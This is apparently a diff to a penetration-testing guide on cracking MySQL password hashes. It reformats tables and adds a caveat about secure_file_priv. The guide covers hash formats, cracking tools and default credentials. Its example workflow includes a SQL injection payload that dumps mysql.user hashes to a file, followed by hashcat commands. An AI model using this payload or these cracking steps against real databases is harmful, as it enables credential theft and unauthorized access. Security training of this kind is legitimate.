@@ -15,24 +15,24 @@ After extracting MySQL password hashes through SQL injection, the next step is o
 
 Before attempting to crack MySQL password hashes, it's important to identify the hash type:
 
-| MySQL Version | Hash Format | Example |
-|---------------|-------------|---------|
-| Pre-4.1 | 16-character hex | `5d2e19393cc5ef67` |
-| 4.1 to 5.6 | '*' + 40-character hex | `*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19` |
-| 5.7+ (default) | '*' + 40-character hex | `*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19` |
-| 8.0+ (optional) | '$A$005$' + mixed case | `$A$005$XKK#jY,d89Z0s8...` |
+| MySQL Version   | Hash Format             | Example                                     |
+| --------------- | ----------------------- | ------------------------------------------- |
+| Pre-4.1         | 16-character hex        | `5d2e19393cc5ef67`                          |
+| 4.1 to 5.6      | '\*' + 40-character hex | `*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19` |
+| 5.7+ (default)  | '\*' + 40-character hex | `*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19` |
+| 8.0+ (optional) | '$A$005$' + mixed case  | `$A$005$XKK#jY,d89Z0s8...`                  |
 
 ### Cracking Tools
 
 Several tools can be used to crack MySQL password hashes:
 
-| Tool | Description | Strengths |
-|------|-------------|-----------|
-| Hashcat | GPU-accelerated password cracker | Fast, supports many attack modes |
-| John the Ripper | CPU-based password cracker | Well-established, flexible |
-| Hydra | Online password cracker | For direct MySQL authentication |
-| Medusa | Online password cracker | For direct MySQL authentication |
-| Custom scripts | Python/Ruby scripts | For specialized attacks |
+| Tool            | Description                      | Strengths                        |
+| --------------- | -------------------------------- | -------------------------------- |
+| Hashcat         | GPU-accelerated password cracker | Fast, supports many attack modes |
+| John the Ripper | CPU-based password cracker       | Well-established, flexible       |
+| Hydra           | Online password cracker          | For direct MySQL authentication  |
+| Medusa          | Online password cracker          | For direct MySQL authentication  |
+| Custom scripts  | Python/Ruby scripts              | For specialized attacks          |
 
 ### Hashcat Commands for MySQL Hashes
 
@@ -106,13 +106,13 @@ hashcat -m 11200 -a 6 mysql_hashes.txt rockyou.txt ?d?d?d?d
 
 Many MySQL installations use default or weak passwords:
 
-| Username | Common Passwords |
-|----------|------------------|
-| root | (empty), root, password, mysql |
-| admin | admin, password, mysql |
-| backup | backup, password |
-| user | user, password |
-| test | test, password |
+| Username | Common Passwords               |
+| -------- | ------------------------------ |
+| root     | (empty), root, password, mysql |
+| admin    | admin, password, mysql         |
+| backup   | backup, password               |
+| user     | user, password                 |
+| test     | test, password                 |
 
 ### Wordlist Resources
 
@@ -136,16 +136,21 @@ Some useful wordlist sources:
 ### Practical Example Workflow
 
 1. **Extract hashes**:
+
    ```sql
    ' UNION SELECT User, Password FROM mysql.user INTO OUTFILE '/tmp/mysql_hashes.txt' -- -
    ```
 
-2. **Prepare hash file** (remove '*' if using hashcat mode 300):
+   > **Note:** `INTO OUTFILE` requires MySQL's `secure_file_priv` system variable to allow writes to the target directory. Many modern MySQL installations restrict this to a specific directory or disable it entirely (`secure_file_priv = NULL`). This example may not work without adjusting server configuration or having appropriate privileges.
+
+2. **Prepare hash file** (remove '\*' if using hashcat mode 300):
+
    ```bash
    cat mysql_hashes.txt | cut -d '*' -f 2 > mysql_hashes_clean.txt
    ```
 
 3. **Run cracking tool**:
+
    ```bash
    hashcat -m 11200 -a 0 mysql_hashes.txt rockyou.txt -r rules/best64.rule
    ```
